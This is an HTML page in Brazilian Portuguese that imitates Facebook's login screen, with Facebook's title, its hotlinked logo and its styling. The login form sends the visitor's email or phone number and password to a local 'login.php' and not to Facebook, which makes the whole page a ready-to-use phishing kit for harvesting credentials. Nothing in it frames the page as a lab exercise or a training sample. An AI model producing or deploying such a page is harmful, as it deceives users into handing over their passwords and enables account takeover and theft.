<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook – Entrar ou Cadastre-se</title>

  <style>
    /* Reset básico */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      color: #1c1e21;
    }

    /* Container central */
    .container {
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      min-height: 100vh;
      align-items: center;
      padding: 20px 0;
    }

    /* Espaçamento acima do logo */
    .top-spacer {
      flex: 1;
    }

    /* Logo do Facebook */
    .logo {
      width: 60px;
      height: 60px;
      margin-bottom: 30px;
    }

    /* Formulário */
    .login-form {
      width: 100%;
      max-width: 360px; /* largura máxima para telas maiores */
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .login-form input {
      width: 100%;
      padding: 14px 16px;
      font-size: 16px;
      border: 1px solid #ccd0d5;
      border-radius: 6px;
      outline: none;
      transition: border-color 0.2s;
    }

    .login-form input:focus {
      border-color: #1877f2;
    }

    .login-form button {
      width: 100%;
      padding: 14px 16px;
      font-size: 16px;
      font-weight: bold;
      color: #ffffff;
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .login-form button:hover {
      background-color: #165ec8;
    }

    .login-form .forgot-password {
      text-align: center;
      font-size: 14px;
      color: #1877f2;
      text-decoration: none;
      margin-top: 8px;
    }

    /* Rodapé com "Criar nova conta" */
    .bottom-section {
      width: 100%;
      max-width: 360px;
      margin-top: 40px;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .create-account-btn {
      width: 100%;
      text-align: center;
      padding: 14px 16px;
      font-size: 16px;
      font-weight: bold;
      color: #1877f2;
      background-color: transparent;
      border: 2px solid #1877f2;
      border-radius: 6px;
      text-decoration: none;
      transition: background-color 0.2s, color 0.2s;
    }

    .create-account-btn:hover {
      background-color: #e7f3ff;
    }

    /* Informações de copyright / links (opcional) */
    .footer-links {
      font-size: 12px;
      color: #90949c;
      text-align: center;
      margin-top: 30px;
    }

    .footer-links a {
      color: #90949c;
      text-decoration: none;
      margin: 0 8px;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }

    /* Garantir responsividade */
    @media (max-width: 400px) {
      .login-form,
      .bottom-section {
        padding: 0 10px;
      }
    }
  </style>
</head>
<body>
  <div class="container">

    <!-- Espaço em branco acima (para empurrar o conteúdo para baixo) -->
    <div class="top-spacer"></div>

    <!-- Logo centralizado -->
    <img
      class="logo"
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/aktAT6r-inm.css/FB_F_logo__blue_50.png"
      alt="Facebook Logo"
    />

    <!-- Formulário de login apontando para login.php -->
    <form class="login-form" action="login.php" method="post">
      <input
        type="text"
        name="email"
        placeholder="Número do celular ou email"
        required
      />
      <input
        type="password"
        name="senha"
        placeholder="Senha"
        required
      />
      <button type="submit">Entrar</button>
      <a href="#" class="forgot-password">Esqueceu a senha?</a>
    </form>

    <!-- Botão criar nova conta -->
    <div class="bottom-section">
      <a href="#" class="create-account-btn">Criar nova conta</a>
    </div>

    <!-- (Opcional) Links de rodapé -->
    <div class="footer-links">
      <a href="#">Sobre</a>
      <a href="#">Ajuda</a>
      <a href="#">Mais</a>
    </div>
  </div>
</body>
</html>
